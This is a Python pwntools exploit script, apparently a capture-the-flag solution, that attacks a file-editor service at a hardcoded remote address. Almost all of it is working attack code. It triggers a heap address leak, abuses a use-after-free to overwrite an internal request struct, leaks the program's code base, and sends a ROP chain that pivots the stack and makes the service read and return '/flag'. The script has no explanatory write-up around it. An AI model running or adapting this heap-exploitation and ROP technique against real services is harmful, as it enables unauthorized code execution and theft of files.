import random
import string

from pwn import *


def create_file(pc, filename, format, content=''):
    pc.sendlineafter('[*] 2 - Edit File', '0')
    pc.sendlineafter(':', filename)
    pc.sendlineafter(':', format)
    pc.sendlineafter(':', str(len(content)))
    if len(content) != 0:
        pc.sendafter(':', content)


def delete_file(pc):
    pc.sendlineafter('[*] 2 - Edit File', '1')


def edit_file(pc, filename, format):
    pc.sendlineafter('[*] 2 - Edit File', '2')
    pc.sendlineafter(':', filename)
    pc.sendlineafter(':', format)


def edit_file_update_content(pc, content=''):
    pc.sendlineafter('[*] 3 - Exit file editor', '0')
    pc.sendlineafter(':', str(len(content)))
    if len(content) != 0:
        pc.send(content)


def edit_file_change_display_format(pc, df):
    pc.sendlineafter('[*] 3 - Exit file editor', '1')
    pc.sendlineafter('[*] 1 - HEXDUMP:', str(df))


def edit_file_display_content(pc):
    pc.sendlineafter('[*] 3 - Exit file editor', '2')


def edit_file_exit_file_editor(pc):
    pc.sendlineafter('[*] 3 - Exit file editor', '3')


def create_req(
    print_fn=0,
    filename='',
    filename_len=0,
    fileformat='',
    fileformat_len=0,
    data=0,
    data_size=0
):
    req = ''.join([
        p64(print_fn),
        filename.ljust(100, '\x00'),
        p32(0),
        p64(filename_len),
        fileformat.ljust(16, '\x00'),
        p64(fileformat_len),
        p64(data),
        p64(data_size)
    ])

    return req


def random_string(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def main():
    client = remote('142.93.113.55', 31090)
    # client = remote('localhost', 30047)

    create_file(client, 'AAAA', 'AAAA')
    log.info('create req struct with data_len = 0, it leads to heap leak')
    edit_file(client, 'AAAA', 'AAAA')
    edit_file_display_content(client)

    client.recvline()
    heap = u64(client.recvline()[17:-1].ljust(8, '\x00'))
    log.success('heap @ ' + hex(heap))

    edit_file_exit_file_editor(client)

    create_file(client, 'BBBB', 'BBBB')
    create_file(client, 'CCCC', 'CCCC')

    create_file(client, 'DDDD', 'DDDD')
    log.info('clear cache and proceed with uaf')

    filename = '/flag\x00'
    server_req = (p8(4) + p32(0xdeadbeef) + p8(len(filename)) + filename).ljust(0x30, '\x00')

    req = create_req(
        print_fn=0x41414141,
        filename='FFFF' + p32(0) + server_req,
        filename_len=4,
        fileformat='FFFF',
        fileformat_len=4,
        data=heap+0x2bf0,
        data_size=0xa8
    )
    create_file(client, 'EEEE', 'EEEE', req)
    log.info('alloc on existing req struct and overwrite it')
    
    edit_file(client, 'FFFF', 'FFFF')
    edit_file_change_display_format(client, 0)
    edit_file_display_content(client)
    log.info('leak code address from an existing req struct')

    client.recvline()
    
    code_base = u64(client.recvline()[17:-1].ljust(8, '\x00')) - 0x1f90
    
    write       = code_base + 0x1760
    read        = code_base + 0x1920
    
    mov_rdi_rsp = code_base + 0x5b10
    pop_rdi     = code_base + 0x3236
    pop_rsi     = code_base + 0x4b25
    pop_rdx     = code_base + 0x5b24
    
    log.success('code base @ ' + hex(code_base))
    log.success('write     @ ' + hex(write))
    log.success('read      @ ' + hex(read))

    rop = ''.join([
        # write request to the server
        p64(pop_rdi),
        p64(3),
        p64(pop_rsi),
        p64(heap+0x2b50),
        p64(pop_rdx),
        p64(len(server_req)),
        p64(write),

        # read request from server
        p64(read),
        p64(pop_rdi),
        p64(1),
        p64(write)
    ])

    log.info('rop size = {}'.format(len(rop)))

    pause()
    req = create_req(
        print_fn=mov_rdi_rsp,
        filename='DDDD' + p32(0) + rop,
        filename_len=4,
        fileformat='DDDD',
        fileformat_len=4,
        data=heap+0x2bf0+0x10,
        data_size=0xa8
    )
    edit_file_update_content(client, req)
    edit_file_exit_file_editor(client)
    log.info('overwrite req struct with rop and execute "mov rsp, rdi"')

    edit_file(client, 'DDDD', 'DDDD')
    edit_file_display_content(client)
    log.info('enjoying the flag :)')

    client.interactive()


if __name__ == '__main__':
    main()